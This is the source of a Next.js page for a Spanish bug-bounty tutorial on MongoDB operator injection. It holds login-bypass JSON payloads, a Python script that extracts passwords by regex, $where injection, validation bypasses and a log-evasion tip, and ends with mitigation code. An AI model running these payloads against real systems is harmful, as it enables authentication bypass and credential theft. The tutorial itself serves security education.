'use client';

import WikiArticleLayout from '@/components/WikiArticleLayout';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Database, Lock, Code2, Zap, ArrowRight, Shield } from 'lucide-react';
import Link from 'next/link';
import { useParams } from 'next/navigation';

export default function MongoDBOperatorInjectionPage() {
  const params = useParams();
  const locale = params.locale as string;

  return (
    <WikiArticleLayout
      category="Bug Bounty"
      categoryColor="red"
      title="MongoDB Operator Injection"
      description="Explotación de objetos NoSQL ($gt, $ne, $regex) para bypassear autenticación y extraer datos JSON sin queries SQL tradicionales."
      level="Junior Developer"
      readTime="18 minutos"
      cvssScore={8.5}
      lastUpdated="Enero 2026"
    >
      
      {/* Introducción */}
      <Section id="introduccion" title="¿Qué es NoSQL Injection?">
        <Paragraph>
          A diferencia de SQL, las bases de datos <Strong>NoSQL como MongoDB</Strong> no usan queries en formato texto. 
          En su lugar, usan <Strong>objetos JavaScript/JSON</Strong> que pueden ser manipulados para alterar la 
          lógica de las consultas.
        </Paragraph>

        <AlertInfo title="Diferencia clave con SQL Injection">
          <ul className="space-y-2 mt-2">
            <ListItem>
              <Strong>SQL:</Strong> Inyectas strings como <InlineCode>' OR '1'='1</InlineCode>
            </ListItem>
            <ListItem>
              <Strong>NoSQL:</Strong> Inyectas objetos como <InlineCode>{`{"$ne": null}`}</InlineCode>
            </ListItem>
          </ul>
        </AlertInfo>

        <Paragraph className="mt-4">
          Muchos developers creen que al usar MongoDB están "protegidos" de injection, pero esto es un 
          <span className="font-semibold text-red-600 dark:text-red-400">mito peligroso</span>.
        </Paragraph>
      </Section>

      {/* Login Bypass */}
      <Section id="login-bypass" title="1. Login Bypass con Operadores">
        
        <Subsection title="Escenario Vulnerable">
          <Paragraph>
            Una API que recibe credenciales en JSON y las pasa directamente a MongoDB:
          </Paragraph>

          <CodeBlock
            language="javascript"
            title="❌ Código vulnerable (Node.js + Express)"
            code={`// API endpoint vulnerable
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  
  // ❌ PELIGRO: Pasa directamente el input del usuario
  const user = await db.collection('users').findOne({
    username: username,
    password: password
  });
  
  if (user) {
    res.json({ success: true, token: generateToken(user) });
  } else {
    res.json({ success: false });
  }
});`}
          />

          <AlertDanger title="¿Por qué es vulnerable?">
            Si el atacante envía un <Strong>objeto en lugar de un string</Strong>, puede manipular 
            la query de MongoDB usando sus operadores especiales.
          </AlertDanger>
        </Subsection>

        <Subsection title="Payload de Ataque: Operador $ne (Not Equal)">
          <Paragraph>
            En lugar de enviar strings normales, enviamos objetos con operadores de MongoDB:
          </Paragraph>

          <CodeBlock
            language="json"
            title="Payload - Login bypass con $ne"
            code={`// Request normal (legítimo)
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "username": "admin",
  "password": "secretpass123"
}

// Request malicioso (ataque)
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "username": "admin",
  "password": {"$ne": null}
}`}
          />

          <HighlightBox color="red" title="🔓 ¿Cómo funciona?" icon={<Lock className="w-6 h-6 text-red-600 dark:text-red-400" />}>
            <Paragraph className="mb-3">
              El payload <InlineCode>{`{"$ne": null}`}</InlineCode> se traduce a:
            </Paragraph>
            <CodeBlock
              language="javascript"
              code={`// Query resultante en MongoDB
db.collection('users').findOne({
  username: "admin",
  password: { $ne: null }  // ← "password NOT EQUAL a null"
});

// Esto significa: "Dame el usuario 'admin' cuya contraseña NO sea null"
// ¡Y prácticamente TODAS las contraseñas cumplen esa condición!`}
            />
            <Paragraph className="mt-3">
              <span className="font-semibold text-red-700 dark:text-red-300">Resultado:</span> Login exitoso sin conocer la contraseña real.
            </Paragraph>
          </HighlightBox>
        </Subsection>

        <Subsection title="Otros Operadores Útiles para Bypass">
          <CodeBlock
            language="json"
            title="Variantes de payloads"
            code={`// $gt (greater than) - Mayor que
{
  "username": "admin",
  "password": {"$gt": ""}
}

// $regex - Expresión regular que coincide con todo
{
  "username": "admin",
  "password": {"$regex": ".*"}
}

// $in - Password está en un array (siempre true)
{
  "username": "admin",
  "password": {"$in": ["admin", "password", "123456", "", null]}
}

// $exists - Campo password existe
{
  "username": "admin",
  "password": {"$exists": true}
}`}
          />

          <AlertTip title="Payload más sigiloso">
            El operador <InlineCode>$gt con string vacío</InlineCode> es menos sospechoso en logs que <InlineCode>$ne null</InlineCode>, 
            porque parece una comparación "normal".
          </AlertTip>
        </Subsection>
      </Section>

      {/* Extracción de Datos */}
      <Section id="exfiltracion" title="2. Extracción de Datos con $regex">
        
        <Subsection title="Escenario: Exfiltrar Contraseñas Carácter por Carácter">
          <Paragraph>
            Usando <Strong>expresiones regulares</Strong>, podemos extraer datos bit a bit, 
            similar a Time-blind SQL Injection pero basado en respuestas booleanas.
          </Paragraph>

          <CodeBlock
            language="json"
            title="Payload - Detectar primer carácter de password"
            code={`// ¿La contraseña del admin empieza con 'a'?
{
  "username": "admin",
  "password": {"$regex": "^a"}
}

// ¿Empieza con 'b'?
{
  "username": "admin",
  "password": {"$regex": "^b"}
}

// ... Continuar hasta encontrar el carácter correcto`}
          />

          <TerminalOutput title="Respuestas del servidor">
            {`// Si el password empieza con 'a'
{"success": false}  ← No coincide

// Si el password empieza con 'p'
{"success": true}   ← ¡Coincide! El primer char es 'p'`}
          </TerminalOutput>
        </Subsection>

        <Subsection title="Script de Automatización (Python)">
          <CodeBlock
            language="python"
            title="mongodb_password_exfiltration.py"
            code={`import requests
import string

URL = "https://target.com/api/login"
CHARSET = string.ascii_lowercase + string.digits + "_@.-!#$%"
PASSWORD = ""

print("[+] Iniciando extracción de password del usuario 'admin'...")

# Extraer cada carácter
while True:
    found = False
    
    for char in CHARSET:
        # Construir regex para probar el siguiente carácter
        regex = f"^{PASSWORD}{char}"
        
        payload = {
            "username": "admin",
            "password": {"$regex": regex}
        }
        
        r = requests.post(URL, json=payload)
        
        # Si el login es exitoso, encontramos el carácter
        if r.json().get("success"):
            PASSWORD += char
            print(f"[+] Char encontrado: {char} → Password actual: {PASSWORD}")
            found = True
            break
    
    # Si no se encontró ningún carácter más, terminamos
    if not found:
        break

print(f"\\n[✓] Password completa extraída: {PASSWORD}")`}
          />

          <AlertInfo title="Optimización: Regex case-insensitive">
            Usa el operador <InlineCode>$options</InlineCode> con valor <InlineCode>i</InlineCode> para hacer la búsqueda 
            case-insensitive y acelerar el proceso.
          </AlertInfo>
        </Subsection>

        <Subsection title="Extracción de Múltiples Usuarios">
          <CodeBlock
            language="json"
            title="Payload - Enumerar usuarios con $regex"
            code={`// Usuarios que empiezan con 'a'
{
  "username": {"$regex": "^a"},
  "password": {"$ne": null}
}

// Usuarios de 5 caracteres exactos
{
  "username": {"$regex": "^.{5}$"},
  "password": {"$ne": null}
}

// Usuarios que contienen 'admin'
{
  "username": {"$regex": "admin", "$options": "i"},
  "password": {"$ne": null}
}`}
          />
        </Subsection>
      </Section>

      {/* Operadores Avanzados */}
      <Section id="operadores-avanzados" title="3. Operadores Avanzados">
        
        <Subsection title="$where - JavaScript Injection">
          <Paragraph>
            El operador <InlineCode>$where</InlineCode> permite ejecutar <Strong>código JavaScript arbitrario</Strong> 
            en el contexto del servidor MongoDB. Extremadamente peligroso si no está filtrado.
          </Paragraph>

          <CodeBlock
            language="json"
            title="Payload - $where injection"
            code={`// Bypass de login con código JavaScript
{
  "username": "admin",
  "$where": "return true"
}

// Extraer contraseña carácter por carácter
{
  "username": "admin",
  "$where": "this.password.substring(0,1) == 'p'"
}

// Sleep-based (Time-blind NoSQL)
{
  "username": "admin",
  "$where": "sleep(5000) || true"
}`}
          />

          <AlertDanger title="Impacto crítico">
            Con <InlineCode>$where</InlineCode> puedes:
            <ul className="mt-2 space-y-1">
              <ListItem>Ejecutar JavaScript arbitrario en el servidor</ListItem>
              <ListItem>Acceder a <InlineCode>this</InlineCode> (el documento actual)</ListItem>
              <ListItem>Causar DoS con loops infinitos</ListItem>
              <ListItem>Exfiltrar datos sensibles</ListItem>
            </ul>
          </AlertDanger>
        </Subsection>

        <Subsection title="$lookup - Server-Side Join Injection">
          <CodeBlock
            language="json"
            title="Payload - Unir datos de otras colecciones"
            code={`// Intentar unir con la colección 'admin_keys'
{
  "$lookup": {
    "from": "admin_keys",
    "localField": "_id",
    "foreignField": "user_id",
    "as": "secrets"
  }
}`}
          />
        </Subsection>

        <Subsection title="$expr - Comparaciones Complejas">
          <CodeBlock
            language="json"
            title="Payload - Expresiones condicionales"
            code={`// Bypass cuando username == password
{
  "$expr": {
    "$eq": ["$username", "$password"]
  }
}

// Detectar documentos con campos específicos
{
  "$expr": {
    "$gt": [{"$strLenCP": "$password"}, 10]
  }
}`}
          />
        </Subsection>
      </Section>

      {/* Bypass de Protecciones */}
      <Section id="bypass" title="4. Bypass de Validaciones Comunes">
        
        <Subsection title="Bypass de Type Checking">
          <Paragraph>
            Algunos developers validan "si es string", pero olvidan validar objetos anidados:
          </Paragraph>

          <CodeBlock
            language="javascript"
            title="❌ Validación insuficiente"
            code={`// Intento de validación (INSUFICIENTE)
if (typeof username === 'string' && typeof password === 'string') {
  const user = await db.collection('users').findOne({
    username: username,
    password: password
  });
}

// ❌ Problema: No valida OBJETOS como {"$ne": null}`}
          />

          <CodeBlock
            language="json"
            title="Payload que bypasea esta validación"
            code={`// Nested object injection
{
  "username": "admin",
  "password": {
    "$ne": null
  }
}

// El typeof password será 'object', pero algunos frameworks
// lo convierten automáticamente antes del check`}
          />
        </Subsection>

        <Subsection title="Bypass vía URL Parameters">
          <CodeBlock
            language="http"
            title="Payload - Query string injection"
            code={`GET /api/login?username=admin&password[$ne]=null HTTP/1.1

// Algunos frameworks parsean esto como:
{
  "username": "admin",
  "password": {
    "$ne": null
  }
}`}
          />

          <AlertTip title="Frameworks vulnerables">
            Express.js con <InlineCode>qs</InlineCode> library (por defecto) parsea 
            <InlineCode>password[$ne]=null</InlineCode> como un objeto.
          </AlertTip>
        </Subsection>
      </Section>

      {/* Mitigación */}
      <Section id="mitigacion" title="Mitigación para Developers">
        <AlertDanger title="Cómo prevenir NoSQL Injection">
          <ul className="space-y-3 mt-3">
            <ListItem icon={<Shield className="w-5 h-5 text-green-600 dark:text-green-400" />}>
              <Strong>Input Sanitization:</Strong> Rechaza objetos, solo acepta strings/numbers primitivos
            </ListItem>
            <ListItem icon={<Shield className="w-5 h-5 text-green-600 dark:text-green-400" />}>
              <Strong>Whitelist Validation:</Strong> Valida que NO contengan caracteres $ (operadores)
            </ListItem>
            <ListItem icon={<Shield className="w-5 h-5 text-green-600 dark:text-green-400" />}>
              <Strong>Type Checking Estricto:</Strong> Verifica tipos recursivamente en objetos anidados
            </ListItem>
            <ListItem icon={<Shield className="w-5 h-5 text-green-600 dark:text-green-400" />}>
              <Strong>Deshabilitar $where:</Strong> Configurar MongoDB para bloquear operador $where
            </ListItem>
            <ListItem icon={<Shield className="w-5 h-5 text-green-600 dark:text-green-400" />}>
              <Strong>Hash Passwords:</Strong> NUNCA comparar passwords en plaintext, usar bcrypt/argon2
            </ListItem>
          </ul>
        </AlertDanger>

        <CodeBlock
          language="javascript"
          title="✅ Código seguro con sanitización"
          code={`const validator = require('validator');

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  
  // ✅ Validar que son strings primitivos
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input type' });
  }
  
  // ✅ Rechazar caracteres $ (operadores de MongoDB)
  if (username.includes('$') || password.includes('$')) {
    return res.status(400).json({ error: 'Invalid characters' });
  }
  
  // ✅ Validar formato (opcional pero recomendado)
  if (!validator.isAlphanumeric(username)) {
    return res.status(400).json({ error: 'Invalid username format' });
  }
  
  // ✅ Comparar con hash, NO plaintext
  const user = await db.collection('users').findOne({ username });
  
  if (user && await bcrypt.compare(password, user.passwordHash)) {
    res.json({ success: true, token: generateToken(user) });
  } else {
    res.json({ success: false });
  }
});`}
        />

        <CodeBlock
          language="javascript"
          title="✅ Helper de sanitización reutilizable"
          code={`// Helper para sanitizar inputs de MongoDB
function sanitizeMongoInput(obj) {
  if (typeof obj !== 'object' || obj === null) {
    return obj;
  }
  
  const sanitized = {};
  
  for (const [key, value] of Object.entries(obj)) {
    // Rechazar keys que empiecen con $ (operadores)
    if (key.startsWith('$')) {
      throw new Error(\`Invalid key: \${key}\`);
    }
    
    // Sanitizar recursivamente
    if (typeof value === 'object' && value !== null) {
      sanitized[key] = sanitizeMongoInput(value);
    } else {
      sanitized[key] = value;
    }
  }
  
  return sanitized;
}

// Uso
app.post('/api/data', async (req, res) => {
  try {
    const sanitized = sanitizeMongoInput(req.body);
    const result = await db.collection('data').find(sanitized).toArray();
    res.json(result);
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});`}
        />
      </Section>

      {/* Siguiente Paso */}
      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: Redis RCE</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/redis-lua-rce`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-red-600 to-pink-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-red-500/50 transition-all"
        >
          <span>Redis RCE via Lua Sandboxing</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>

    </WikiArticleLayout>
  );
}
